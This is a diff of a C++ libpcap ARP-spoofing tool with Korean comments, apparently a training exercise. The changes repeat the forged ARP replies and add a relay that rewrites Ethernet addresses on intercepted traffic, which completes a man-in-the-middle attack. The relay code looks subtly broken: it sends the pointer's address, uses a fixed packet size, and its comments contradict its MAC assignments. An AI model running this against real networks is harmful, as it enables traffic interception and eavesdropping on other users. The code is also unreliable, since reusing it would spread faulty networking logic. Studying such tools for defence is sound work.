@@ -108,7 +108,11 @@ void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
 	packet.arp_.tmac_ = senderMac;
 	packet.arp_.tip_ = htonl(targetIp);
 
+	// packet loss대비
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+
 	//printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -209,11 +213,11 @@ int main(int argc, char* argv[]) {
 		}
 
 		// check packet
-		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
+		EthArpPacket* eth_arp_pkt = (EthArpPacket*)(cap_packet);
+		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
 
 		// ARP 패킷
 		if (ntohs(eth_arp_pkt->eth_.type_) == EthHdr::Arp){
-			const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
 			// if sender and target ip not in the Network 
 
 			Ip senderIp = arp_hdr->sip();
@@ -244,25 +248,40 @@ int main(int argc, char* argv[]) {
 			send_arp_spoof(SenderNet[senderIp], senderIp,targetIp);
 		}
 
-		//ARP가 아닌데 sip가 센더Ip면
-		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
-		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
+		// not ARP, packet's senderIP is in my sender Network -> packet 
 
-		// int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		// //printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
-		// if (res != 0) {
-		// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-		// }
+		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp && !eth_arp_pkt->eth_.dmac().isBroadcast()){
+			//relay
+			//origin packet = senderIP, MAC, targetIP, MAC
+			//infectoin packet = senderIP, MAC, targetIP, AttackerMac
+			//relay pakcet = senderIP, AttackerMAC, targetIP, targetMAC
 
+			// int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+			// //printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
+			// if (res != 0) {
+			// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			// }
 
+			
+			// src mac
+			// fix senderMAC -> AttackerMac
+			eth_arp_pkt->eth_.dmac_ = attackerMac;
 
-		// 공격 대상의 sender의 ARP 패킷이면
-		// 센더 - 어택 -> 타겟 브로드 relay
-		// if(ARPEntry.find(Network.find(arp_hdr->sip()))==ARPEntry.end()) continue;
-		// Ip senderIp = arp_hdr->sip();
-		// Ip targetIp = arp_hdr->tip();
-		// //send_arp_spoof(attackerMac, attackerIp, ARPEntry[senderIp], senderIp, targetIp);
-		
+			// dst mac
+			// fix AttackerMAC -> targetMAC
+			eth_arp_pkt->eth_.smac_ = TargetNet[eth_arp_pkt->arp_.tip_];
+
+			pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&eth_arp_pkt), sizeof(EthArpPacket));
+
+			// 공격 대상의 sender의 ARP 패킷이면
+			// 센더 - 어택 -> 타겟 브로드 relay
+			// if(ARPEntry.find(Network.find(arp_hdr->sip()))==ARPEntry.end()) continue;
+			// Ip senderIp = arp_hdr->sip();
+			// Ip targetIp = arp_hdr->tip();
+			// //send_arp_spoof(attackerMac, attackerIp, ARPEntry[senderIp], senderIp, targetIp);
+			
+
+		}
 
 	}
 
